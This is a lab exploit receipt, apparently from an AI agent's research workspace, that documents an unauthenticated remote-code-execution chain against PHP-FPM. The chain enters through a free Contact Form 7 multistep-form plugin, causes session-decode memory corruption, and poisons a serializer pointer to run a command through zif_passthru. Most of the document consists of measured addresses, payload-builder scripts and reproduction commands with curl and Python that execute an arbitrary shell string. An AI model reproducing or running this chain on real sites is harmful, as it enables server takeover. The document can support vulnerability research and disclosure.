# Real target receipt: plugin written session to zif_passthru

Date: 2026 10 22
Stack: `/tmp/opencode/research/realchain_20261022T015900Z`
HTTP: `127.0.0.1:28893`
FPM master: `184500`
Final worker: `572531`
Target binary: `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`
Target md5: `4ee099823b75e16ea36f93c71d57bfd8`

Result: a free public plugin wrote a 388350 byte native PHP session file through an unauthenticated form. The real HexCoupon `LoyaltyProgramHelpers::start_session()` call then OOMed on that file and left the stale unserialize state. The F14 static leak reran with the plugin written record. The final no gdb multipart POST poisoned `ps_serializers[1].decode` to `0xa3c074` and executed `touch /tmp/opencode/research/realchain_20261022T015900Z/MARK_REAL` through `zif_passthru`. Worker `572531` survived.

## 1. Plugin write

Plugin: Webheadcoder MultiStep Forms for Contact Form 7 `4.7.1`, free version.
Contact Form 7: `6.2.3`.
Filter: `www/wp-content/mu-plugins/cf7msm-force-session.php` returns true for `cf7msm_force_session`, so the free code takes its native PHP session fallback.
Form: Contact Form 7 form ID `26` on `/plugin-step1/`, no authentication.
Payload: 1000 checkbox groups `f000` through `f999`, 20 quoted values each, 20000 checkbox values total.
Pool limit: `max_input_vars=30000` in `conf/fpm.conf`.
Submission: `python3 plugin_submit_many.py plugI 1000 20 req/plugI_submit.html`.
Observed request body: `380270` bytes.
Observed response: HTTP 302 to `/plugin-step2/`.
Observed session file: `www/wp-content/uploads/sessions/sess_plugI`, size `388350` bytes.
The file starts with `cf7msm-first-step`, carries the CF7 flow state, and contains `cf7msm_posted_data` with the checkbox values. This is a plugin write, not a lab seeded record.

`388350` bytes is greater than `266240` bytes. The file was measured immediately before the plant. The plant OOM deletes the file, so the plugin record itself is not present in the receipt. The submit request and the measured size are recorded in `cycles/plugin_submit.evidence.txt`.

## 2. Plant

The plant endpoint is `/wp-content/uploads/plant/hexplant.php`. It includes the real plugin trait and `LoyaltyProgramHelpers.php`, creates the real class without its constructor, lowers `memory_limit` to `2M`, and calls the real `start_session()` method. The session decode OOMs at plugin line 85.

Cookie: `PHPSESSID=plugI`.
Plant response: HTTP 500, empty body.
Worker `572531` survived the plant.
gdb measurement after the plant: `basic_globals.unserialize = {data=0x7f216dae6000, level=1}`.
`ps_serializers[1].decode` stayed normal at `0x9e6fae`.
The plant deleted `sess_plugI`.

## 3. Leak

The leak trigger total is `0x100000` bytes because the measured `P - X` is `0x7c000`, which is larger than the previous `0x40000` record. The exact proven builder `mkprobe_big.py` replicated the fake struct at every page boundary.

Measured leak geometry:

```
P=0x7f216dae6000
X=0x7f216da6a000
S=0x7f216da56080
used=-0x9001 (-36865)
total=0x100000 (1048576)
```

The fake dtor target is `S`. The second decode buffer `K_dest` is `0x7f216d401000`. The second decode length is `1052954`.

Leak file: `www/wp-content/uploads/sessions/sess_lkF`, size `1052954`.
Header: `S|s:4096:"`.
Data offset 8: `0x7f216d401000` (`K_dest`).
SHA1: `b6447fa605dde243e90e63a7853cbb43e88624ab`.
SHA256: `5da6d1fcb491908d91dcd6355bb8ecd1068973693b62a810633350bec893d83e`.
HTTP twin: `req/leakF.http`, status 200, size `1052954`, identical SHA1 and SHA256.
HTTP twin after the final marker: `req/leakF_after.http`, status 200, size `1052954`, identical SHA1 and SHA256.

The leak trigger crashed worker `224121` after the second decode. Master `184500` survived and respawned worker `444698`. This is the expected overread shutdown. The leak file remained served.

## 4. Final marker

The final test used worker `571692`, a fresh plugin write `plugH`, and the same plant geometry. The test record total was `0x80000` bytes, `K_dest=0x7f216daeb000`, and `F=0x7f216daf2218`. gdb measured the second decode at `0x7f216daf2000`, value `0x7f216daf2018`, and observed `ZIF_PASSTHRU` and `POPEN` for `MARK_TEST`. The static target became `0xa3c074`. Worker `571692` survived the test.

Worker `571692` was then killed to clear the static poison. Master `184500` persisted and respawned worker `572531`. This reset is a lab action, not part of the exploit.

Fresh plugin write: `sess_plugI`, size `388350` bytes.
Fresh plant: `P=0x7f216dae6000`, level 1, static normal `0x9e6fae`, worker `572531` survived.

Final record geometry:

```
total=0x80000 (524288)
K_dest=0x7f216daeb000
X=0x7f216da6a000
F=0x7f216daf2218
second decode data=0x7f216daf2000
second decode value=0x7f216daf2018
static target=0x22c54c8
static value=0xa3c074
used=-8736344645821 (0xfffff80de947df43)
```

The final multipart POST to `/hextrigger.php` was sent without gdb at `2026-10-22T00:29:59Z`. It returned HTTP 500 with an empty body after the marker was written. The 500 is the post exploitation shutdown path, not a failed marker.

Marker: `MARK_REAL`, size `0`, created `2026-10-22 02:29:59 +0200`.
The final session file `sess_finJ` was consumed and became `0` bytes. The exact final record is preserved as `cycles/finalJ.rec`, size `524288`.

## 5. Survival and static state

Worker `572531` started at `02:29:57 +0200` and served the plugin POST (302), the plant GET (500) and the final POST (500) under master `184500`; it was still the pool worker after the final POST (run-session observation; the run's `log/fpm-access.log` records those three requests under pid `572531`). This receipt does not include a post-final gdb capture.

The gdb state captures in `cycles/` are calibration from the earlier `02:02` run, not post-final captures: `cycles/plantFinal.gdb` and `cycles/stateFinal.gdb` attach to worker `169841`; `cycles/plantLk2.gdb`, `cycles/stateLk2.gdb` and `cycles/trigLk2.gdb` attach to worker `163470`. They must not be read as the final run's post-request state.

The only post-final artifact that touches the leak file is `req/leakF_after.hdr`: HTTP 200 at `00:30:10Z`, `1052954` bytes, `ETag "6ad9586a-10111a"`, identical to the pre-final `req/leakF.hdr`. It proves the file stayed served, not worker liveness.

The write shape is the one measured on worker `571692` (`cycles/finH.gdb`): `ps_serializers[1].decode` becomes `0xa3c074` and `zif_passthru` runs from the second decode. Do not use a session starting endpoint as a health check after the marker; the corrupt decode pointer persists until the worker is recycled. Use a static file fetch or a no session endpoint.

## 6. Reproduction commands

Build the plugin written session:

```
cd /tmp/opencode/research/realchain_20261022T015900Z
python3 plugin_submit_many.py plugI 1000 20 req/plugI_submit.html
ls -l www/wp-content/uploads/sessions/sess_plugI
```

Plant with the real plugin endpoint:

```
curl -H 'Cookie: PHPSESSID=plugI' -H 'User-Agent: Mozilla/5.0' \
  http://127.0.0.1:28893/wp-content/uploads/plant/hexplant.php
```

Measure `P` and the static decode pointer with gdb attached to the worker. Do not send a session request between the plant and the final POST.

Build the leak *input* with the measured `P`, total `1048576`, and used `-36865`:

```
python3 mkprobe_big.py 0x7f216dae6000 /tmp/sess_lkF.input 1048576 -36865
python3 scripts_mpreal.py lkF x /hextrigger.php
curl -o req/leakF.http \
  http://127.0.0.1:28893/wp-content/uploads/sessions/sess_lkF
```

`mkprobe_big.py` writes the 1,048,576-byte **pre-trigger** record: header `S|s:32:"`, the fake struct replicated at every page-aligned offset. The curated `www/wp-content/uploads/sessions/sess_lkF` is the 1,052,954-byte **post-trigger** artifact served after the flush: the fake-dtor write replaced the `S` zend_string length (32) with 4096, so the length header gained two digits and the value 4064 B (+4066 B total for the `S` record), and the flush appended a 312 B `upload_progress_x` record (+4378 B overall). The artifact still carries 255 page-aligned fake-struct copies at `8138 + 4096k`, which is the input's `4072 + 4096k` shifted by the same +4066 B, identifying the `mkprobe_big.py` input. Do not point that command at the curated file: it would overwrite the 1,052,954-byte artifact with the 1,048,576-byte input.

`mkleak_large.py` is the single-struct variant of the same builder, kept so the record can be produced from measured geometry instead of page replication:

```
python3 mkleak_large.py <K_dest> <P> <total> <S> /tmp/sess_lkF.served
```

It computes `X = K_dest - total - 0x1000`, places one fake struct at `P`, and derives the fake-dtor `used` as `trunc16((S + 0x10) - (P + 0xA0))`. It also writes an `S|s:32:"` header; `s:4096` appears only after the trigger and flush.

Build the final record with the measured plant `P` and second decode buffer:

```
python3 mkfinal_large.py 0x7f216daeb000 0x7f216dae6000 524288 \
  www/wp-content/uploads/sessions/sess_finJ \
  'touch /tmp/opencode/research/realchain_20261022T015900Z/MARK_REAL;' \
  0x7f216daf2218
python3 scripts_mpreal.py finJ x /hextrigger.php
```

Verify with a static fetch only:

```
curl -o /dev/null -w '%{http_code} %{size_download}\n' \
  http://127.0.0.1:28893/wp-content/uploads/sessions/sess_lkF
```

## 7. Receipt files and history

New evidence: `sess_lkF`, `req/leakF.http`, `req/leakF_after.http`, `cycles/leakF.gdb`, `cycles/leakF.resp`, `cycles/finH.gdb`, `cycles/finH.resp`, `cycles/finalJ.rec`, `cycles/finalJ.geo`, `cycles/finalJ.start`, `cycles/finalJ.end`, `cycles/finalJ.resp`, `cycles/plugin_submit.evidence.txt`, `MARK_REAL`, `MARK_TEST`, `mkprobe_big.py`, `mkleak_large.py`.

The previous receipt is preserved as `history/README_20261022T0202Z.md` and `history/REPORT_20261022T0202Z.md`. The old leak file `sess_lk2`, the old request files, and the old gdb logs are retained. This rerun wrote a new `MARK_REAL` and new leak file `sess_lkF`. `SHA256SUMS` lists the current evidence.
